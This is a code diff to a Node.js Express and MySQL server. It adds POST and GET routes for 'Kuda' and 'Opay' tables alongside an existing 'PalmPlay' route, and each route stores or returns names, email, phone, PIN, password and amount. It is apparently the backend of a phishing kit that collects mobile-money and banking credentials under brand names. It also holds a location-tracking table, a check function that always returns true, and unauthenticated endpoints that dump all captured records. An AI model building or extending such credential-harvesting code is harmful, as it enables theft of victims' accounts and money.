@@ -1,3 +1,4 @@
+
 const express = require("express");
 const mysql = require("mysql2");
 const cors = require("cors");
@@ -17,6 +18,10 @@ const getLocationQuery = "SELECT * FROM LocationTracker";
 let postLocationQuery = "INSERT INTO LocationTracker (time, location) VALUES (?,?)";
 const postPalmPlayDataQuery = "INSERT INTO PalmPlay (firstName, lastName, email, phoneNumber, pin, password, amount) VALUES (?,?,?,?,?,?,?)";
 const getPalmPlayDataQuery = "SELECT * FROM PalmPlay";
+const postKudaDataQuery = "INSERT INTO Kuda (firstName, lastName, email, phoneNumber, pin, password, amount) VALUES (?,?,?,?,?,?,?)";
+const getKudaDataQuery = "SELECT * FROM Kuda";
+const postOpayDataQuery = "INSERT INTO Opay (firstName, lastName, email, phoneNumber, pin, password, amount) VALUES (?,?,?,?,?,?,?)";
+const getOpayDataQuery = "SELECT * FROM Opay";
 function checkingData(client_firstname, client_lastname, client_phonenumber, client_password, client_pin, client_amount) {
     return true;
 };
@@ -106,6 +111,44 @@ app.post("/PostPalmPlayData", (req, res)=>{
     const password = req.body.password;
     const amount = req.body.amout;
     db.query(postPalmPlayDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
+        if(err) throw err;
+    });
+    res.end();
+});
+app.get("/GetKudaData", (req, res)=>{
+    db.query(getKudaDataQuery, (err, result)=>{
+        if(err) throw err;
+        res.send(result);
+    });
+});
+app.post("/PostKudaData", (req, res)=>{
+    const firstName = req.body.firstName;
+    const lastName = req.body.lastName;
+    const email = req.body.email;
+    const phoneNumber = req.body.phoneNumber;
+    const pin = req.body.pin;
+    const password = req.body.password;
+    const amount = req.body.amout;
+    db.query(postKudaDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
+        if(err) throw err;
+    });
+    res.end();
+});
+app.get("/GetOpayData", (req, res)=>{
+    db.query(getOpayDataQuery, (err, result)=>{
+        if(err) throw err;
+        res.send(result);
+    });
+});
+app.post("/PostOpayData", (req, res)=>{
+    const firstName = req.body.firstName;
+    const lastName = req.body.lastName;
+    const email = req.body.email;
+    const phoneNumber = req.body.phoneNumber;
+    const pin = req.body.pin;
+    const password = req.body.password;
+    const amount = req.body.amout;
+    db.query(postOpayDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
         if(err) throw err;
     });
     res.end();
